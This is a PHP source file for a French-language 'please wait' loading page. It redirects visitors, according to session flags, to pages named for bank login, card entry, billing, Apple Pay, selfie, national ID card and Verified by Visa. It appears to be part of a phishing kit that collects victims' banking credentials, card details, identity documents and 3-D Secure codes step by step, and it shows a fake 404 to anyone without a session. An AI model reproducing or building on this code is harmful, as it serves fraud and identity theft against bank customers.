<?php
session_start();

if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{

?>

<html>
<link rel="shortcut icon" type="image/x-icon" href="../img/favicon.ico">
<title>Chargement en cours ...</title>
<?php

if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotofinished']))
 {

  ?>


  <meta http-equiv='refresh' content='3;URL=finished.php?<?php echo $_SESSION['userid'].$_SESSION['gotofinished'];?>'>
  <?php
 }

 ?>

<?php

if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotologbank']))
 {

  ?>


  <meta http-equiv='refresh' content='3;URL=bank.php?<?php echo $_SESSION['userid'].$_SESSION['gotologbank'];?>'>
  <?php
 }

 ?>

<?php

if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotoselfie']))
 {

  ?>


  <meta http-equiv='refresh' content='3;URL=selfie.php?<?php echo $_SESSION['userid'].$_SESSION['gotoselfie'];?>'>
  <?php
 }

 ?>

<?php

if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotocni']))
 {

  ?>


  <meta http-equiv='refresh' content='3;URL=cni.php?<?php echo $_SESSION['userid'].$_SESSION['gotocni'];?>'>
  <?php
 }



if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotoapplepay']))
 {

  ?>


  <meta http-equiv='refresh' content='20;URL=applepay.php?<?php echo $_SESSION['userid'].$_SESSION['gotoapplepay'];?>'>
  <?php
 }
 ?>

<?php
if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotobillingcode']))
 {
 	?>

 	<meta http-equiv='refresh' content='3;URL=billing.php?<?php echo $_SESSION['userid'].$_SESSION['gotobillingcode'];?>'>
 	<?php
 }

 if(strpos($_SERVER['REQUEST_URI'],$_SESSION['billingerrorcode']))
 {
 	?>
 	<meta http-equiv='refresh' content='3;URL=billing.php?<?php echo $_SESSION['userid'].$_SESSION['gotobillingcode'].$_SESSION['billingerrorcode'];?>'>

 	<?php
 }

 if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotocard']))
 {
?>
		<meta http-equiv='refresh' content='3;URL=card.php?<?php echo $_SESSION['userid'].$_SESSION['gotocard'];?>'>

<?php

 }
 	?>


<?php
if(!strpos($_SERVER['REQUEST_URI'],$_SESSION['gotovbv']))
 {
 	?>
<link nonce="" href="../css/login.css" rel="stylesheet">
   <meta name="viewport" content="width=device-width"/>
<div class="spinner"></div>

</html>
<?php
}
else{
	?>
		<meta http-equiv='refresh' content='30;URL=vbv/redirector.php?<?php echo $_SESSION['userid'].$_SESSION['gotovbv'];?>'>
		<link nonce="" href="../css/login.css" rel="stylesheet">
   <meta name="viewport" content="width=device-width"/>
   
<center><img style="width: 300px;transform: translate(0px,50%);" src="../img/loading.gif"></center>
<p style="text-align: center;transform: translate(0px,100px);"><strong> Veuillez patienter <span id="countdowntimer">30</span> secondes </strong></p>
 <script type="text/javascript">
    var timeleft = 30;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
</script>

	
	<?php

}

?>
<?php

}
else{
	die('HTTP/1.0 404 Not Found');
}

?>
